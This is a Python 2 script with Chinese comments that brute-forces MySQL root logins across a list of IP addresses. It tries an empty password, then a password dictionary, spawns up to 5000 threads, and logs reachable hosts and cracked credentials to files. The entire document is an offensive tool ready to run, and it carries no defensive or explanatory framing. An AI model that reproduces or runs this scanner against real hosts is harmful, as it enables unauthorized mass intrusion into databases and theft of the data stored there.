#!/usr/bin/env python
#coding=utf-8
#author:Blus

import pymysql
import threading
import time

def pymysql_connect(ip,  mysql_password,event):
    event1=event
    try:
        event1.clear()
        pymysql.connect(ip, mysql_user, mysql_password, '' , 3306)
        event1.clear()
        print ip + ":" + mysql_password + "  connected"
        ip_log('port_connected.txt', ip, mysql_password)

    except Exception,e:
        e = str(e)
        #print e
        if (e.find('Access denied') != -1):
            # 端口开放，但密码错误，记录并继续下面的爆破代码
            event1.set() #设置爆破标志
            #print ip + ":" + mysql_password + "  密码错误"
            #ip_log('port_opend.txt', ip, "密码错误")
            pass
        elif (e.find('many connections') != -1):
            # 连接过多,暂停1秒
            time.sleep(1)
            event1.set()
            pass
        elif (e.find('Can\'t connect') != -1):
            # 端口未开放,退出
            event1.clear()
        else:
            # 其他错误，记录并退出
            event1.clear()
            ip_log('port_opend.txt', ip, e)
        return

#爆破函数
def mysql_connect2(ip):

    # 先尝试空密码连接threading.Event()
    event1 = threading.Event()
    t2 = threading.Thread(target=pymysql_connect, args=(ip, '',event1))
    t2.start()
    t2.join(3) #3秒超时

    if not event1.isSet():
       #未设置标识则退出
        return

    ip_log('port_opend.txt', ip, "密码错误")

    # 开始爆破
    global list_password
    for mysql_password in list_password:
        mysql_password = mysql_password.replace('\r', "").replace('\n', "")
        t2 = threading.Thread(target=pymysql_connect, args=(ip, mysql_password, event1))
        t2.start()
        t2.join(5)  # 秒超时
        if not event1.isSet():
            # 未设置标识则退出,不然就继续爆破
            return
    return

def ip_log(txt_name,ip,content):
    try:
        f1 = open(txt_name, 'a')
        f1.write(ip + ":" + content + "\r\n")
        f1.close()
    except Exception, e:
        print str(e)
        pass

if __name__ == "__main__":

    #设置数据库用户名
    mysql_user='root'

    #设置同时运行的线程数
    threads=5000

    #指定IP网段
    New_start = raw_input(unicode('导入IP:', 'utf-8').encode('gbk'))  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    ip1 = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    #将密码字典读进列表
    list_password= list(set([x.strip() for x in open('password.txt','r').readlines()]))


    for ip in ip1:
        ip=str(ip)

        #限制同时运行的线程数
        while (threading.activeCount() > threads):
            time.sleep(1)

        t1 = threading.Thread(target=mysql_connect2, args=(ip,))
        t1.start()


    while(threading.activeCount()!=1):
        # 当线程只剩1时，说明执行完了
        time.sleep(1)
    print "检测结束"
